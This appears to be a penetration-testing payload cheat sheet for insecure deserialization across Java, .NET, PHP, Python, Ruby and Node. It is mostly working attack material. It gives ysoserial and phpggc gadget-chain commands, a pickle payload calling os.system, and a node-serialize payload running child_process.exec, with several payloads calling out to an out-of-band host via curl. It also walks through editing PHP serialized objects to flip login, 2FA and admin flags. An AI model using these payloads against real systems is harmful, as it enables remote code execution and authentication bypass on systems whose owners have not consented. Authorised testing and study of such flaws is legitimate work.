---
title: "Payloads: Insecure Deserialization"
type: payloads
tags: [payloads, deserialization, rce, java, dotnet, php, python]
sources: []
date_created: 2026-06-16
date_updated: 2026-06-30
---

# Payloads: Insecure Deserialization

Gadget-chain RCE per language. **Always fire a benign OOB probe first** (Java URLDNS) to prove the sink before a command gadget. Routed via the `hunt-deserialization` skill. See [[insecure-deserialization]].

## Fingerprint (magic bytes, base64)
```
rO0AB           Java (0xAC 0xED)        AAEAAAD/////    .NET BinaryFormatter
a:2:{ / O:4:    PHP serialize()         gASV / gAR      Python pickle
BAh / --- !ruby Ruby Marshal / YAML     _$$ND_FUNC$$_   Node node-serialize
```

## Java (ysoserial)
```bash
java -jar ysoserial.jar URLDNS "http://<id>.oob.example" | base64 -w0     # OOB PROBE first
java -jar ysoserial.jar CommonsCollections6 "curl http://<id>.oob.example/x" | base64 -w0
# common gadgets: CommonsCollections1-7, CommonsBeanutils1, Spring1/2, Hibernate1, ROME, Clojure
# JRMP listener for ysoserial JRMPClient chains:
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 'cmd'
```

## .NET (ysoserial.net)
```
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "calc"
ysoserial.exe -p ViewState --generator=<__VIEWSTATEGENERATOR> --validationkey=<key> --validationalg=SHA1 -c "cmd"
# formatters: BinaryFormatter, LosFormatter, Json.Net, ObjectDataProvider (XAML)
```

## PHP (phpggc, or hand-built POP chain)
```bash
phpggc Laravel/RCE9 system id              # framework gadget chains
phpggc Monolog/RCE1 system id -b           # base64 output
# hand-built: class with __destruct/__wakeup/__toString reaching a sink
# phar deserialization (no unserialize() call needed):
phpggc Monolog/RCE1 system id --phar phar -o evil.phar   # then trigger via phar://upload.jpg
```

### Object property injection - NO gadget needed (try this FIRST)
A serialized PHP object in a **cookie or param** (`O:N:"Class":...`) that the app `unserialize()`s and
then trusts for an auth/state decision = flip the property, no gadget chain required. Recognize the
shape and rewrite the value:
```
O:9:"AuthToken":1:{s:9:"validated";b:0;}     ->   ...;b:1;}        # boolean 2FA/login flag: false->true
O:4:"User":2:{s:4:"name";s:3:"bob";s:7:"isAdmin";b:0;}  -> isAdmin b:1, or name->"admin"
# serialized format: b:0/b:1 bool · i:N int · s:LEN:"str" (LEN must match new length!) · O:LEN:"Class":COUNT:{...}
```
URL-decode the cookie, edit the flag, URL-encode back. If you change a string, fix its length prefix.
This was THM Extract's 2FA bypass (flip `validated` `b:0`->`b:1`). Only reach for phpggc/POP gadgets
(above) when a flag flip isn't enough and a class with a useful magic method is in scope. See
[[insecure-deserialization]].

## Python (pickle / yaml)
```python
import pickle, os, base64
class E:
    def __reduce__(self): return (os.system, ("curl http://<id>.oob.example",))
print(base64.b64encode(pickle.dumps(E())).decode())
# unsafe YAML:
# !!python/object/apply:os.system ["id"]
```

## Ruby
```
# unsafe YAML.load / Marshal.load -> universal gadget (Gem / DependencyList)
--- !ruby/object:Gem::Installer ...   # use a current universal RCE chain
```

## Node (node-serialize)
```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://<id>.oob.example')}()"}
```
